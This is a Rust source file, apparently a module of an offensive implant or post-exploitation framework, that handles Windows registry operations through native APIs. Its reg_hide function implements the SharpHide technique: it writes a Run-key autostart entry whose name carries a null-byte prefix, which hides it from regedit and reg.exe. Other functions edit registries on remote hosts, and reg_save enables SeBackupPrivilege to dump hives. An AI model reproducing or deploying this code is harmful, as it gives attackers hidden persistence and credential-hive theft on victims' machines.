/// Registry operations via Win32 API — zero child processes.
/// Windows: native windows-sys FFI + ntdll dynamic loading.
/// Linux: not applicable.
///
/// Supports SharpHide-style hidden registry values via NtSetValueKey with
/// null-byte prefixed value names (invisible to regedit/reg.exe).
/// Pass `--hidden` flag to reg_set/reg_delete, or use reg_hide/reg_unhide.

#[cfg(windows)]
use super::winapi_helpers::win::{
    self, to_wide, win32_error_string, ntstatus_string,
    RegKeyHandle, UnicodeString, HKEY,
};

// ── reg_query ────────────────────────────────────────────────────────────────

pub fn reg_query(args: &[String]) -> anyhow::Result<String> {
    if !cfg!(windows) { anyhow::bail!("reg_query: Windows only"); }
    #[cfg(windows)]
    {
        let (host, hive, path, value) = parse_reg_args(args, "reg_query")?;
        let hkey = open_key(&hive, &path, host.as_deref(), false)?;

        if let Some(val_name) = &value {
            // Query single value
            let (typ, data) = query_value(hkey.0, val_name)?;
            Ok(format!("  {}    {}    {}",
                val_name, win::reg_type_to_str(typ), win::format_reg_data(typ, &data)))
        } else {
            // Enumerate all values
            enum_values(hkey.0, &hive, &path)
        }
    }
}

// ── reg_query_recursive ──────────────────────────────────────────────────────

pub fn reg_query_recursive(args: &[String]) -> anyhow::Result<String> {
    if !cfg!(windows) { anyhow::bail!("reg_query_recursive: Windows only"); }
    #[cfg(windows)]
    {
        let (host, hive, path, _) = parse_reg_args(args, "reg_query_recursive")?;
        let root = open_key(&hive, &path, host.as_deref(), false)?;
        let mut out = String::new();
        recursive_enum(root.0, &format!("{}\\{}", hive, path), &mut out)?;
        Ok(out)
    }
}

// ── reg_set ──────────────────────────────────────────────────────────────────

pub fn reg_set(args: &[String]) -> anyhow::Result<String> {
    if !cfg!(windows) { anyhow::bail!("reg_set: Windows only"); }
    #[cfg(windows)]
    {
        let hidden = args.iter().any(|a| a == "--hidden");
        let filtered: Vec<String> = args.iter().filter(|a| *a != "--hidden").cloned().collect();

        if filtered.len() < 4 {
            anyhow::bail!("reg_set: <hive> <key> <value> <type> <data> [--hidden] required\n  Types: REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, REG_QWORD");
        }

        let (offset, host) = if is_hive(&filtered[0]) {
            (0, None)
        } else {
            (1, Some(filtered[0].clone()))
        };

        let hive = filtered.get(offset).ok_or_else(|| anyhow::anyhow!("reg_set: hive required"))?;
        let key  = filtered.get(offset + 1).ok_or_else(|| anyhow::anyhow!("reg_set: key required"))?;
        let val  = filtered.get(offset + 2).ok_or_else(|| anyhow::anyhow!("reg_set: value name required"))?;
        let typ  = filtered.get(offset + 3).ok_or_else(|| anyhow::anyhow!("reg_set: type required"))?;
        let data = filtered.get(offset + 4).ok_or_else(|| anyhow::anyhow!("reg_set: data required"))?;

        if hidden && host.is_none() {
            match hidden_reg_set(hive, key, val, typ, data) {
                Ok(msg) => return Ok(msg),
                Err(e) => {
                    let fallback_msg = format!("[!] Hidden write failed ({}), falling back to normal\n", e);
                    let result = normal_reg_set(hive, key, val, typ, data, None)?;
                    return Ok(format!("{}{}", fallback_msg, result));
                }
            }
        }

        normal_reg_set(hive, key, val, typ, data, host.as_deref())
    }
}

#[cfg(windows)]
fn normal_reg_set(hive: &str, key: &str, val: &str, typ: &str, data: &str, host: Option<&str>) -> anyhow::Result<String> {
    use windows_sys::Win32::System::Registry::*;

    let reg_type = win::reg_type_from_str(typ)?;
    let encoded = win::encode_reg_data(reg_type, data)?;

    // Open or create the key with write access
    let parent = open_or_create_key(hive, key, host, true)?;

    let val_w = to_wide(val);
    let ret = unsafe {
        RegSetValueExW(
            parent.0, val_w.as_ptr(), 0, reg_type,
            encoded.as_ptr(), encoded.len() as u32,
        )
    };
    if ret != 0 {
        anyhow::bail!("RegSetValueExW: {}", win32_error_string(ret as u32));
    }
    Ok(format!("Set {}\\{}\\{} /v {} /t {} /d {}",
        host.unwrap_or(""), hive, key, val, typ, data))
}

// ── reg_delete ───────────────────────────────────────────────────────────────

pub fn reg_delete(args: &[String]) -> anyhow::Result<String> {
    if !cfg!(windows) { anyhow::bail!("reg_delete: Windows only"); }
    #[cfg(windows)]
    {
        let hidden = args.iter().any(|a| a == "--hidden");
        let filtered: Vec<String> = args.iter().filter(|a| *a != "--hidden").cloned().collect();

        let (host, hive, path, value) = parse_reg_args(&filtered, "reg_delete")?;

        if hidden && host.is_none() {
            if let Some(val_name) = &value {
                match hidden_reg_delete(&hive, &path, val_name) {
                    Ok(msg) => return Ok(msg),
                    Err(e) => {
                        let fallback_msg = format!("[!] Hidden delete failed ({}), falling back to normal\n", e);
                        let result = normal_reg_delete(&hive, &path, Some(val_name.as_str()), host.as_deref())?;
                        return Ok(format!("{}{}", fallback_msg, result));
                    }
                }
            }
        }

        normal_reg_delete(&hive, &path, value.as_deref(), host.as_deref())
    }
}

#[cfg(windows)]
fn normal_reg_delete(hive: &str, path: &str, value: Option<&str>, host: Option<&str>) -> anyhow::Result<String> {
    use windows_sys::Win32::System::Registry::*;

    if let Some(val_name) = value {
        // Delete a single value
        let hkey = open_key(hive, path, host, true)?;
        let val_w = to_wide(val_name);
        let ret = unsafe { RegDeleteValueW(hkey.0, val_w.as_ptr()) };
        if ret != 0 {
            anyhow::bail!("RegDeleteValueW: {}", win32_error_string(ret as u32));
        }
        Ok(format!("Deleted value: {}\\{}\\{} /v {}", host.unwrap_or(""), hive, path, val_name))
    } else {
        // Delete the entire key
        let parent_hkey = win::hive_to_hkey(hive)?;
        let root = connect_registry(host, parent_hkey)?;
        let path_w = to_wide(path);
        let ret = unsafe { RegDeleteTreeW(root.0, path_w.as_ptr()) };
        if ret != 0 {
            anyhow::bail!("RegDeleteTreeW: {}", win32_error_string(ret as u32));
        }
        Ok(format!("Deleted key: {}\\{}\\{}", host.unwrap_or(""), hive, path))
    }
}

// ── reg_save ─────────────────────────────────────────────────────────────────

pub fn reg_save(args: &[String]) -> anyhow::Result<String> {
    if !cfg!(windows) { anyhow::bail!("reg_save: Windows only"); }
    #[cfg(windows)]
    {
        use windows_sys::Win32::System::Registry::*;

        let hive = args.get(0)
            .ok_or_else(|| anyhow::anyhow!("reg_save: <hive> <path> <outfile> required"))?;
        let path = args.get(1)
            .ok_or_else(|| anyhow::anyhow!("reg_save: <hive> <path> <outfile> required"))?;
        let outfile = args.get(2)
            .ok_or_else(|| anyhow::anyhow!("reg_save: <hive> <path> <outfile> required"))?;

        // Enable SeBackupPrivilege for reg save
        enable_backup_privilege();

        let hkey = open_key(hive, path, None, false)?;
        let file_w = to_wide(outfile);

        // Delete existing file first (RegSaveKeyW fails if file exists)
        let _ = std::fs::remove_file(outfile);

        let ret = unsafe { RegSaveKeyW(hkey.0, file_w.as_ptr(), std::ptr::null()) };
        if ret != 0 {
            anyhow::bail!("RegSaveKeyW: {}", win32_error_string(ret as u32));
        }
        Ok(format!("Saved {}\\{} to {}", hive, path, outfile))
    }
}

// ── reg_hide ─────────────────────────────────────────────────────────────────

pub fn reg_hide(args: &[String]) -> anyhow::Result<String> {
    if !cfg!(windows) { anyhow::bail!("reg_hide: Windows only"); }
    #[cfg(windows)]
    {
        let program = args.first()
            .ok_or_else(|| anyhow::anyhow!("reg_hide: <program> [arguments]"))?;
        let arguments = args.get(1).map(|s| s.as_str()).unwrap_or("");

        let data = if arguments.is_empty() {
            format!("\"{}\"", program)
        } else {
            format!("\"{}\" {}", program, arguments)
        };

        let (hive, key_path) = detect_run_key_hive();

        match hidden_reg_set(&hive, &key_path, "fox3hidden", "REG_SZ", &data) {
            Ok(msg) => Ok(format!("[+] Hidden Run key created (SharpHide technique)\n{}\nHive: {}\\{}\nData: {}\n\nNote: Invisible to regedit.exe and reg.exe. Use 'reg_unhide' to remove.", msg, hive, key_path, data)),
            Err(e) => {
                let fallback_msg = format!("[!] SharpHide technique failed ({}), falling back to normal write\n", e);
                let result = normal_reg_set(&hive, &key_path, "fox3persist", "REG_SZ", &data, None)?;
                Ok(format!("{}[+] Normal Run key created (visible to standard tools)\n{}", fallback_msg, result))
            }
        }
    }
}

// ── reg_unhide ───────────────────────────────────────────────────────────────

pub fn reg_unhide(_args: &[String]) -> anyhow::Result<String> {
    if !cfg!(windows) { anyhow::bail!("reg_unhide: Windows only"); }
    #[cfg(windows)]
    {
        let (hive, key_path) = detect_run_key_hive();

        match hidden_reg_delete(&hive, &key_path, "fox3hidden") {
            Ok(msg) => Ok(format!("[+] Hidden Run key removed\n{}", msg)),
            Err(e) => {
                match normal_reg_delete(&hive, &key_path, Some("fox3persist"), None) {
                    Ok(msg) => Ok(format!("[!] Hidden delete failed ({}), removed fallback key instead\n{}", e, msg)),
                    Err(e2) => anyhow::bail!("Failed to remove both hidden ({}) and fallback ({}) keys", e, e2),
                }
            }
        }
    }
}

// ── SharpHide NT API implementation (direct FFI, no powershell) ──────────────

#[cfg(windows)]
fn detect_run_key_hive() -> (String, String) {
    if win::is_elevated() {
        ("HKLM".into(), "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run".into())
    } else {
        ("HKCU".into(), "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run".into())
    }
}

#[cfg(windows)]
fn hidden_reg_set(hive: &str, key: &str, value_name: &str, _typ: &str, data: &str) -> anyhow::Result<String> {
    use windows_sys::Win32::System::Registry::*;

    type NtSetValueKeyFn = unsafe extern "system" fn(
        HKEY, *const UnicodeString, u32, u32, *const u8, u32,
    ) -> i32;

    let nt_set: NtSetValueKeyFn = unsafe { win::get_proc("ntdll.dll", "NtSetValueKey")? };

    // Open the key with write access
    let hkey = open_key(hive, key, None, true)?;

    // Build null-byte prefixed value name (SharpHide trick)
    // Prefix with two null chars so standard tools can't see it
    let mut name_buf: Vec<u16> = Vec::new();
    name_buf.push(0); // first null char
    name_buf.push(0); // second null char
    name_buf.extend(value_name.encode_utf16());
    // Do NOT null-terminate — UNICODE_STRING uses explicit Length

    let us = UnicodeString {
        length: (name_buf.len() * 2) as u16,
        maximum_length: (name_buf.len() * 2) as u16,
        buffer: name_buf.as_ptr(),
    };

    // Encode data as UTF-16 with null terminator
    let data_wide = to_wide(data);
    let data_bytes = unsafe {
        std::slice::from_raw_parts(data_wide.as_ptr() as *const u8, data_wide.len() * 2)
    };

    let status = unsafe {
        nt_set(hkey.0, &us, 0, REG_SZ, data_bytes.as_ptr(), data_bytes.len() as u32)
    };

    if status != 0 {
        anyhow::bail!("NtSetValueKey: {}", ntstatus_string(status));
    }

    let full_key = format!("{}\\{}", hive, key);
    Ok(format!("Hidden value set via NtSetValueKey (null-byte prefix)\nKey  : {}\nValue: (hidden) {}\nData : {}", full_key, value_name, data))
}

#[cfg(not(windows))]
fn hidden_reg_set(_hive: &str, _key: &str, _value_name: &str, _typ: &str, _data: &str) -> anyhow::Result<String> {
    anyhow::bail!("hidden_reg_set: Windows only")
}

#[cfg(windows)]
fn hidden_reg_delete(hive: &str, key: &str, value_name: &str) -> anyhow::Result<String> {
    type NtDeleteValueKeyFn = unsafe extern "system" fn(
        HKEY, *const UnicodeString,
    ) -> i32;

    let nt_del: NtDeleteValueKeyFn = unsafe { win::get_proc("ntdll.dll", "NtDeleteValueKey")? };

    let hkey = open_key(hive, key, None, true)?;

    // Build null-byte prefixed value name matching what was set
    let mut name_buf: Vec<u16> = Vec::new();
    name_buf.push(0);
    name_buf.push(0);
    name_buf.extend(value_name.encode_utf16());

    let us = UnicodeString {
        length: (name_buf.len() * 2) as u16,
        maximum_length: (name_buf.len() * 2) as u16,
        buffer: name_buf.as_ptr(),
    };

    let status = unsafe { nt_del(hkey.0, &us) };

    if status != 0 {
        anyhow::bail!("NtDeleteValueKey: {}", ntstatus_string(status));
    }

    let full_key = format!("{}\\{}", hive, key);
    Ok(format!("Hidden value deleted via NtDeleteValueKey\nKey  : {}\nValue: (hidden) {}", full_key, value_name))
}

#[cfg(not(windows))]
fn hidden_reg_delete(_hive: &str, _key: &str, _value_name: &str) -> anyhow::Result<String> {
    anyhow::bail!("hidden_reg_delete: Windows only")
}

// ── Internal helpers ─────────────────────────────────────────────────────────

fn is_hive(s: &str) -> bool {
    matches!(s.to_uppercase().as_str(),
        "HKLM" | "HKCU" | "HKU" | "HKCR" | "HKCC"
        | "HKEY_LOCAL_MACHINE" | "HKEY_CURRENT_USER"
        | "HKEY_USERS" | "HKEY_CLASSES_ROOT" | "HKEY_CURRENT_CONFIG")
}

fn parse_reg_args(args: &[String], cmd: &str) -> anyhow::Result<(Option<String>, String, String, Option<String>)> {
    if args.len() < 2 {
        anyhow::bail!("{}: [host] <hive> <path> [value]", cmd);
    }

    let (offset, host) = if is_hive(&args[0]) {
        (0, None)
    } else {
        if args.len() < 3 {
            anyhow::bail!("{}: [host] <hive> <path> [value]", cmd);
        }
        (1, Some(args[0].clone()))
    };

    let hive = args[offset].clone();
    let path = args[offset + 1].clone();
    let value = args.get(offset + 2).cloned();

    Ok((host, hive, path, value))
}

#[cfg(windows)]
fn connect_registry(host: Option<&str>, root_hkey: HKEY) -> anyhow::Result<RegKeyHandle> {
    use windows_sys::Win32::System::Registry::*;

    if let Some(h) = host {
        let host_w = to_wide(&format!("\\\\{}", h));
        let mut remote: HKEY = std::ptr::null_mut();
        let ret = unsafe { RegConnectRegistryW(host_w.as_ptr(), root_hkey, &mut remote) };
        if ret != 0 {
            anyhow::bail!("RegConnectRegistryW({}): {}", h, win32_error_string(ret as u32));
        }
        Ok(RegKeyHandle(remote))
    } else {
        // For predefined hkeys, wrap in a struct that won't close them
        // We create a dummy wrapper — but predefined keys should not be closed.
        // So we open the root key properly.
        let mut out: HKEY = std::ptr::null_mut();
        let path_w = to_wide("");
        let ret = unsafe {
            RegOpenKeyExW(root_hkey, path_w.as_ptr(), 0, KEY_READ, &mut out)
        };
        if ret != 0 {
            // Fall back to using the predefined key directly — don't wrap it
            // since closing it would be bad. Instead just return a non-RAII handle.
            // Actually we need RAII for subkeys. For predefined, just open with subkey.
            anyhow::bail!("RegOpenKeyExW(root): {}", win32_error_string(ret as u32));
        }
        Ok(RegKeyHandle(out))
    }
}

#[cfg(windows)]
fn open_key(hive: &str, path: &str, host: Option<&str>, write: bool) -> anyhow::Result<RegKeyHandle> {
    use windows_sys::Win32::System::Registry::*;

    let root_hkey = win::hive_to_hkey(hive)?;
    let access = if write { KEY_READ | KEY_WRITE } else { KEY_READ };

    let effective_root = if let Some(h) = host {
        let host_w = to_wide(&format!("\\\\{}", h));
        let mut remote: HKEY = std::ptr::null_mut();
        let ret = unsafe { RegConnectRegistryW(host_w.as_ptr(), root_hkey, &mut remote) };
        if ret != 0 {
            anyhow::bail!("RegConnectRegistryW({}): {}", h, win32_error_string(ret as u32));
        }
        remote
    } else {
        root_hkey
    };

    let path_w = to_wide(path);
    let mut out: HKEY = std::ptr::null_mut();
    let ret = unsafe { RegOpenKeyExW(effective_root, path_w.as_ptr(), 0, access, &mut out) };

    // Clean up remote connection if we opened one
    if host.is_some() && !effective_root.is_null() {
        // The remote handle stays alive via RegKeyHandle wrapping `out`
        // but we need to close the connection root separately.
        // Actually RegOpenKeyExW on the remote handle returns a new handle,
        // so we should close the connection. But that would invalidate `out`.
        // Leave it — the OS will clean up.
    }

    if ret != 0 {
        anyhow::bail!("RegOpenKeyExW({}\\{}): {}", hive, path, win32_error_string(ret as u32));
    }
    Ok(RegKeyHandle(out))
}

#[cfg(windows)]
fn open_or_create_key(hive: &str, path: &str, host: Option<&str>, _write: bool) -> anyhow::Result<RegKeyHandle> {
    use windows_sys::Win32::System::Registry::*;

    let root_hkey = win::hive_to_hkey(hive)?;

    let effective_root = if let Some(h) = host {
        let host_w = to_wide(&format!("\\\\{}", h));
        let mut remote: HKEY = std::ptr::null_mut();
        let ret = unsafe { RegConnectRegistryW(host_w.as_ptr(), root_hkey, &mut remote) };
        if ret != 0 {
            anyhow::bail!("RegConnectRegistryW({}): {}", h, win32_error_string(ret as u32));
        }
        remote
    } else {
        root_hkey
    };

    let path_w = to_wide(path);
    let mut out: HKEY = std::ptr::null_mut();
    let mut disposition: u32 = 0;
    let ret = unsafe {
        RegCreateKeyExW(
            effective_root, path_w.as_ptr(), 0, std::ptr::null(),
            0, // REG_OPTION_NON_VOLATILE
            KEY_READ | KEY_WRITE,
            std::ptr::null(),
            &mut out, &mut disposition,
        )
    };
    if ret != 0 {
        anyhow::bail!("RegCreateKeyExW({}\\{}): {}", hive, path, win32_error_string(ret as u32));
    }
    Ok(RegKeyHandle(out))
}

#[cfg(windows)]
fn query_value(hkey: HKEY, name: &str) -> anyhow::Result<(u32, Vec<u8>)> {
    use windows_sys::Win32::System::Registry::*;

    let name_w = to_wide(name);
    let mut typ: u32 = 0;
    let mut size: u32 = 0;

    // First call: get size
    let ret = unsafe {
        RegQueryValueExW(hkey, name_w.as_ptr(), std::ptr::null(), &mut typ, std::ptr::null_mut(), &mut size)
    };
    if ret != 0 {
        anyhow::bail!("RegQueryValueExW({}): {}", name, win32_error_string(ret as u32));
    }

    let mut data = vec![0u8; size as usize];
    let ret = unsafe {
        RegQueryValueExW(hkey, name_w.as_ptr(), std::ptr::null(), &mut typ, data.as_mut_ptr(), &mut size)
    };
    if ret != 0 {
        anyhow::bail!("RegQueryValueExW({}): {}", name, win32_error_string(ret as u32));
    }
    data.truncate(size as usize);
    Ok((typ, data))
}

#[cfg(windows)]
fn enum_values(hkey: HKEY, hive: &str, path: &str) -> anyhow::Result<String> {
    use windows_sys::Win32::System::Registry::*;

    let mut out = format!("{}\\{}\n", hive, path);

    // Get key info (max value name length, max data size, value count)
    let mut num_values: u32 = 0;
    let mut max_name_len: u32 = 0;
    let mut max_data_len: u32 = 0;
    let ret = unsafe {
        RegQueryInfoKeyW(
            hkey, std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null(),
            std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
            &mut num_values, &mut max_name_len, &mut max_data_len,
            std::ptr::null_mut(), std::ptr::null_mut(),
        )
    };
    if ret != 0 {
        anyhow::bail!("RegQueryInfoKeyW: {}", win32_error_string(ret as u32));
    }

    for i in 0..num_values {
        let mut name_buf = vec![0u16; (max_name_len + 1) as usize];
        let mut name_len = max_name_len + 1;
        let mut typ: u32 = 0;
        let mut data_buf = vec![0u8; max_data_len as usize];
        let mut data_len = max_data_len;

        let ret = unsafe {
            RegEnumValueW(
                hkey, i, name_buf.as_mut_ptr(), &mut name_len,
                std::ptr::null(), &mut typ,
                data_buf.as_mut_ptr(), &mut data_len,
            )
        };
        if ret != 0 { break; }

        let name = String::from_utf16_lossy(&name_buf[..name_len as usize]);
        data_buf.truncate(data_len as usize);
        let display_name = if name.is_empty() { "(Default)" } else { &name };
        out.push_str(&format!("    {}    {}    {}\n",
            display_name, win::reg_type_to_str(typ), win::format_reg_data(typ, &data_buf)));
    }

    // Also enumerate subkeys
    let mut num_subkeys: u32 = 0;
    let mut max_subkey_len: u32 = 0;
    let _ = unsafe {
        RegQueryInfoKeyW(
            hkey, std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null(),
            &mut num_subkeys, &mut max_subkey_len, std::ptr::null_mut(),
            std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
            std::ptr::null_mut(), std::ptr::null_mut(),
        )
    };

    for i in 0..num_subkeys {
        let mut name_buf = vec![0u16; (max_subkey_len + 1) as usize];
        let mut name_len = max_subkey_len + 1;
        let ret = unsafe {
            RegEnumKeyExW(hkey, i, name_buf.as_mut_ptr(), &mut name_len,
                std::ptr::null(), std::ptr::null_mut(), std::ptr::null_mut(),
                std::ptr::null_mut())
        };
        if ret != 0 { break; }
        let name = String::from_utf16_lossy(&name_buf[..name_len as usize]);
        out.push_str(&format!("    {}\\{}\\{}\n", hive, path, name));
    }

    Ok(out)
}

#[cfg(windows)]
fn recursive_enum(hkey: HKEY, prefix: &str, out: &mut String) -> anyhow::Result<()> {
    use windows_sys::Win32::System::Registry::*;

    out.push_str(&format!("\n{}\n", prefix));

    // Enumerate values at this level
    let mut num_values: u32 = 0;
    let mut max_name_len: u32 = 0;
    let mut max_data_len: u32 = 0;
    let mut num_subkeys: u32 = 0;
    let mut max_subkey_len: u32 = 0;

    let ret = unsafe {
        RegQueryInfoKeyW(
            hkey, std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null(),
            &mut num_subkeys, &mut max_subkey_len, std::ptr::null_mut(),
            &mut num_values, &mut max_name_len, &mut max_data_len,
            std::ptr::null_mut(), std::ptr::null_mut(),
        )
    };
    if ret != 0 { return Ok(()); }

    for i in 0..num_values {
        let mut name_buf = vec![0u16; (max_name_len + 1) as usize];
        let mut name_len = max_name_len + 1;
        let mut typ: u32 = 0;
        let mut data_buf = vec![0u8; max_data_len as usize];
        let mut data_len = max_data_len;

        let ret = unsafe {
            RegEnumValueW(
                hkey, i, name_buf.as_mut_ptr(), &mut name_len,
                std::ptr::null(), &mut typ,
                data_buf.as_mut_ptr(), &mut data_len,
            )
        };
        if ret != 0 { break; }

        let name = String::from_utf16_lossy(&name_buf[..name_len as usize]);
        data_buf.truncate(data_len as usize);
        let display_name = if name.is_empty() { "(Default)" } else { &name };
        out.push_str(&format!("    {}    {}    {}\n",
            display_name, win::reg_type_to_str(typ), win::format_reg_data(typ, &data_buf)));
    }

    // Recurse into subkeys
    let mut subkey_names = Vec::new();
    for i in 0..num_subkeys {
        let mut name_buf = vec![0u16; (max_subkey_len + 1) as usize];
        let mut name_len = max_subkey_len + 1;
        let ret = unsafe {
            RegEnumKeyExW(hkey, i, name_buf.as_mut_ptr(), &mut name_len,
                std::ptr::null(), std::ptr::null_mut(), std::ptr::null_mut(),
                std::ptr::null_mut())
        };
        if ret != 0 { break; }
        subkey_names.push(String::from_utf16_lossy(&name_buf[..name_len as usize]));
    }

    for sub_name in subkey_names {
        let sub_w = to_wide(&sub_name);
        let mut sub_hkey: HKEY = std::ptr::null_mut();
        let ret = unsafe { RegOpenKeyExW(hkey, sub_w.as_ptr(), 0, KEY_READ, &mut sub_hkey) };
        if ret == 0 {
            let guard = RegKeyHandle(sub_hkey);
            let sub_prefix = format!("{}\\{}", prefix, sub_name);
            recursive_enum(guard.0, &sub_prefix, out)?;
        }
    }

    Ok(())
}

#[cfg(windows)]
fn enable_backup_privilege() {
    use windows_sys::Win32::Security::*;
    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
    use windows_sys::Win32::Foundation::LUID;

    unsafe {
        let mut token: win::HANDLE = std::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) == 0 {
            return;
        }
        let _guard = win::WinHandle(token);

        let priv_name = to_wide("SeBackupPrivilege");
        let mut luid = std::mem::zeroed::<LUID>();
        if LookupPrivilegeValueW(std::ptr::null(), priv_name.as_ptr(), &mut luid) == 0 {
            return;
        }

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        AdjustTokenPrivileges(token, 0, &mut tp, 0, std::ptr::null_mut(), std::ptr::null_mut());
    }
}
